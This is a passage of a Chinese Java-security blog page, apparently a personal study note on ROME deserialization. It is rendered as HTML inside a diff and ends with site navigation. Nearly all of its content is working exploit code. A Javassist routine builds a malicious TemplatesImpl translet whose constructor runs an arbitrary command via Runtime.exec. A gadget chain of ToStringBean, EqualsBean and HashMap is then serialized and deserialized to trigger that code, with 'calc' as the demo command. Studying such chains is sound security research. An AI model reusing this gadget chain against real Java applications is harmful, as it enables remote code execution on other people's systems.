class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>);</span><br><span class="line">            ctClass.setSuperclass(superClass);</span><br><span class="line">            <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> CtNewConstructor.make(<span class="string">&quot;public A()&#123;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="string">&quot;\&quot;);\n&#125;&quot;</span>, ctClass);</span><br><span class="line">            ctClass.addConstructor(constructor);</span><br><span class="line">            <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">            ctClass.defrost();</span><br><span class="line">            <span class="keyword">return</span> bytes;</span><br><span class="line"> </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">WriteShell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] shell = GetShellByteCodes.getTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;S&quot;</span>));</span><br><span class="line">        fileOutputStream.write(shell);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        WriteShell();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Shorter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> Serial.Serial;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Equal_Shorter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;A.class&quot;</span>));</span><br><span class="line"> </span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        setValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"> </span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"> </span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"> </span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        Serial.Serialize(hashMap);</span><br><span class="line">        Serial.DeSerialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/01/07/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" data-id="cm5l7vlhs0008fscxhgsi0xis" data-title="C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\ROME反序列化" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2025/01/07/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\MySQL JDBC 反序列化
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2025/01/07/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\SnakeYaml反序列化</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/">安全研究</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/">Java安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Java%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" rel="tag">注入漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Java%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Java安全</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">注入漏洞</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="font-size: 20px;">漏洞分析</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/01/">January 2025</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/01/07/hello-world/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\hello-world</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CC链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/CB%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\CB链反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\Hessian反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/2025/01/07/JNDI%E6%B3%A8%E5%85%A5/">C:\Users\root\Downloads\小刘笔记\Blog\source\_posts\JNDI注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
